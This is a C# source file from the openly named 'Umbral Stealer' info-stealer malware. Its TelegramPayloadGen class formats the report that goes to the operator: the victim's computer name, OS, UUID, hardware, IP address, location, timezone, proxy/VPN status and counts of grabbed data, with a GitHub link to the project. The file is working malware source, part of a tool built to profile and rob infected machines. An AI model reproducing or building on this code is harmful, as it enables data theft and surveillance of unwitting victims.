using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Umbral.payload.SystemInfo;

namespace Umbral.payload.Postman
{
    internal class TelegramPayloadGen
    {
        private readonly Dictionary<string, int> _grabbedDataDict;

        internal TelegramPayloadGen(Dictionary<string, int> grabbedDataDict)
        {
            _grabbedDataDict = grabbedDataDict;
        }

        internal async Task<string> GetPayload()
        {
            IpFormat ipinfo = await IpInfo.GetInfo();
            GeneralSystemInfo systemInfo = await General.GetInfo();

            char cellular = ipinfo.Mobile ? '✅' : '❌';
            char proxy = ipinfo.Proxy ? '✅' : '❌';
            string reverseProxy = ipinfo.Proxy ? $"\nReverse DNS: {ipinfo.Reverse}" : string.Empty;
            
            string grabbedInfo = string.Empty;
            foreach (var item in _grabbedDataDict) 
                grabbedInfo += $"\n{item.Key}: {item.Value}";

            string message = $@"
🔰 *Umbral Stealer* 🔰

*System Information*
• Computer Name: {systemInfo.ComputerName}
• Operating System: {systemInfo.ComputerOs}
• Total Memory: {systemInfo.TotalMemory}
• UUID: {systemInfo.Uuid}
• CPU: {systemInfo.Cpu}
• GPU: {systemInfo.Gpu}

*IP Information*
• IP Address: {ipinfo.Query}
• Region: {ipinfo.RegionName}
• Country: {ipinfo.Country}
• Timezone: {ipinfo.Timezone}
• Cellular Data: {cellular}
• Proxy/VPN: {proxy}{reverseProxy}

*Grabbed Data*{grabbedInfo}

*Version:* {Settings.Version}
*GitHub:* https://github.com/Blank-c/Umbral-Stealer
".Trim();

            return message;
        }
    }
}